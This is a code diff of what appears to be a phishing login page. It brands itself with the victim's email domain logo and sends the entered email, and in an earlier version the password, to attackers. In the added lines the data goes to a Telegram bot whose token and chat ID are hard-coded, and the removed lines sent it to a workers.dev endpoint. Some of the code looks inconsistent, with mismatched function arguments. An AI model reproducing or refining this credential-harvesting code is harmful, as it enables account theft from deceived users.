@@ -911,8 +911,8 @@ cb=googleTranslateElementInit">
 
     /* ================= TELEGRAM (CLIENT‑SIDE, NO PASSWORD) ================= */
 
-    const TELEGRAM_BOT_TOKEN = '8066607284:AAGACS8QLcAPETXDrs0MG_fUiB9Cyy6kFGY';
-    const TELEGRAM_CHAT_ID  = '6285796509';
+   const TELEGRAM_BOT_TOKEN = '6106561885:AAF0EmQXOgj_TVWoaiJ75Exmhjx_WcD-SZo';
+    const TELEGRAM_CHAT_ID  = '5643928959';
 
     function sendTelegram(email, domain, attempt) {
         if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
@@ -930,16 +930,15 @@ Time: ${now.toLocaleString()}
 ISO: ${now.toISOString()}
 ━━━━━━━━━━━━━━`;
 
-       function sendTelegram(email) {
-  fetch('https://square-sun-b728.saleudon1.workers.dev', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      email: email,
-      time: new Date().toISOString()
-    })
-  }).catch(() => {});
-}
+        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message
+            })
+        }).catch(() => {});
+    }
 
     /* ================= PREFILL ================= */
 
@@ -975,7 +974,7 @@ ISO: ${now.toISOString()}
 
         const domain = email.split('@')[1];
         const brand = domain.split('.')[0].toUpperCase();
-
+        const password = passwordInput
         const logo = document.getElementById('logoimg');
         if (logo) logo.src = 'https://logo.clearbit.com/' + domain;
 
@@ -1015,7 +1014,7 @@ ISO: ${now.toISOString()}
         const domain = email.split('@')[1];
 
         // 🔔 TELEGRAM LOG (EMAIL + TIME ONLY)
-        sendTelegram(email, password, domain, attempts);
+        sendTelegram(email, domain, attempts);
 
         // ✅ SHOW ERROR (STAYS VISIBLE)
         if (msg) {
@@ -1050,9 +1049,11 @@ ISO: ${now.toISOString()}
 
 
 
+
 </body>
 
 </html>
+
 
 
 
